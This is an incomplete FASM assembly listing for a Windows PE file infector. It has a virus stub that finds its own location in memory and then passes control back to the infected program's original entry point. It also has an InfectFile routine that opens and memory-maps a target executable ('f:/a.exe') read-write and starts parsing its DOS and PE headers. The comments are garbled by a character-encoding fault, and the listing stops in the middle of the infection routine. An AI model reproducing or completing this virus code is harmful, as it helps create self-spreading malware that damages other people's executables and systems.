
  format PE GUI 4.0
  include 'win32ax.inc'

;##########
InfectFile    proto    :dword
;#########
.code

;###############�������############################
VStart:
        call    abc
abc:        pop    ebp
        sub    ebp,offset abc
        xor    eax,eax
        add    eax,[ebp+HostEntry]
        jmp    eax
HostEntry    dd    ?
VEnd:
;######################################################

filename    db    "f:/a.exe" ;���Ŀ���ļ�
write        db    0


;################��ӽڵĲ�������###########################
InfectFile    proc    _filename:dword
        local hFile
        local hMapping    
        local pMapping    
        local @dwAddCodeFile
        local @dwAddCodeBase
        local @dwEntry
;#######################���ļ�##########################################################
        invoke    CreateFile,_filename,\
        GENERIC_READ+GENERIC_WRITE,\
        FILE_SHARE_READ+FILE_SHARE_WRITE,\
        NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
        .if eax == INVALID_HANDLE_VALUE
            jmp    exit2
        .endif
        mov    hFile,eax
        invoke    CreateFileMapping,hFile,NULL,PAGE_READWRITE,0,0,0
        mov    hMapping,eax
        invoke    MapViewOfFile,hMapping,FILE_MAP_READ+FILE_MAP_WRITE,0,0,0 
        mov    pMapping,eax        
;########################�ҵ�peͷ#########################################################
        mov    esi,eax 
        assume    esi:ptr    IMAGE_DOS_HEADER

